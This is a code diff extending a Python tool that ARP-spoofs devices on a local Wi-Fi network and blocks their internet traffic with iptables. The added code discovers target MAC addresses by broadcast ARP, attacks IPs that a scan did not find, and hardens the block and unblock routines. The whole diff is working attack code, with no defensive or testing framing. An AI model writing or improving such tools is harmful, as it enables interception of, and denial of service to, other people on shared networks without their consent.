@@ -159,6 +159,19 @@ class WiFiTrafficController:
     def arp_spoof(self, target_ip, target_mac):
         """Perform ARP spoofing"""
         try:
+            # If MAC is not known, try to discover it
+            if not target_mac:
+                target_mac = self.discover_mac(target_ip)
+                if target_mac:
+                    # Update the client entry with discovered MAC
+                    for client in self.target_clients:
+                        if client['ip'] == target_ip:
+                            client['mac'] = target_mac
+                            break
+                else:
+                    print(f"⚠️  Could not discover MAC for {target_ip}, skipping ARP spoof")
+                    return
+            
             # Tell target we are the gateway
             ether1 = Ether(src=self.our_mac, dst=target_mac)
             arp1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
@@ -174,6 +187,17 @@ class WiFiTrafficController:
             self.stats['arp_sent'] += 2
         except Exception as e:
             print(f"❌ ARP error: {e}")
+    
+    def discover_mac(self, target_ip):
+        """Discover MAC address for a given IP"""
+        try:
+            # Send ARP request
+            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip), timeout=3, verbose=False)
+            if ans:
+                return ans[0][1].hwsrc
+        except:
+            pass
+        return None
     
     def dns_monitor(self):
         """Monitor and block DNS queries"""
@@ -196,23 +220,34 @@ class WiFiTrafficController:
     def block_traffic(self):
         """Block internet traffic using iptables"""
         for client in self.target_clients:
-            # Block all outbound traffic except local network
-            subprocess.run([
-                'iptables', '-I', 'FORWARD', '-s', client['ip'], 
-                '!', '-d', self.get_network_info(), '-j', 'DROP'
-            ], capture_output=True)
-            print(f"🔒 Blocked: {client['ip']}")
+            try:
+                # Block all outbound traffic except local network
+                result = subprocess.run([
+                    'iptables', '-I', 'FORWARD', '-s', client['ip'], 
+                    '!', '-d', self.get_network_info(), '-j', 'DROP'
+                ], capture_output=True, text=True)
+                
+                if result.returncode == 0:
+                    print(f"🔒 Blocked: {client['ip']}")
+                else:
+                    print(f"⚠️  Failed to block {client['ip']}: {result.stderr}")
+            except Exception as e:
+                print(f"❌ Error blocking {client['ip']}: {e}")
     
     def unblock_traffic(self):
         """Remove blocking rules"""
         for client in self.target_clients:
-            while True:
-                result = subprocess.run([
-                    'iptables', '-D', 'FORWARD', '-s', client['ip'], 
-                    '!', '-d', self.get_network_info(), '-j', 'DROP'
-                ], capture_output=True)
-                if result.returncode != 0:
-                    break
+            try:
+                while True:
+                    result = subprocess.run([
+                        'iptables', '-D', 'FORWARD', '-s', client['ip'], 
+                        '!', '-d', self.get_network_info(), '-j', 'DROP'
+                    ], capture_output=True, text=True)
+                    if result.returncode != 0:
+                        break
+                print(f"✅ Unblocked: {client['ip']}")
+            except Exception as e:
+                print(f"❌ Error unblocking {client['ip']}: {e}")
     
     def start_arp_spoofing(self):
         """Continuous ARP spoofing"""
@@ -261,14 +296,29 @@ class WiFiTrafficController:
                 indices = [int(x.strip()) - 1 for x in selection.split(',')]
                 self.target_clients = [clients[i] for i in indices if 0 <= i < len(clients)]
         else:
+            print(f"🎯 Target IPs provided: {target_ips}")
             all_clients = self.scan_clients()
-            self.target_clients = [c for c in all_clients if c['ip'] in target_ips]
+            print(f"📡 Scanned clients: {[c['ip'] for c in all_clients]}")
+            
+            # Filter clients that were found in scan
+            found_clients = [c for c in all_clients if c['ip'] in target_ips]
+            
+            # For targets not found in scan, create placeholder entries
+            missing_targets = [ip for ip in target_ips if ip not in [c['ip'] for c in all_clients]]
+            for missing_ip in missing_targets:
+                print(f"⚠️  Target {missing_ip} not found in scan, will attempt to block anyway")
+                # Create a placeholder client entry - MAC will be discovered during ARP
+                found_clients.append({'ip': missing_ip, 'mac': None})
+            
+            self.target_clients = found_clients
         
         if not self.target_clients:
             print("❌ No targets selected")
             return
         
-        print(f"🎯 Targeting {len(self.target_clients)} clients")
+        print(f"🎯 Targeting {len(self.target_clients)} clients:")
+        for client in self.target_clients:
+            print(f"  - {client['ip']} ({client['mac'] or 'MAC to be discovered'})")
         
         self.running = True
         
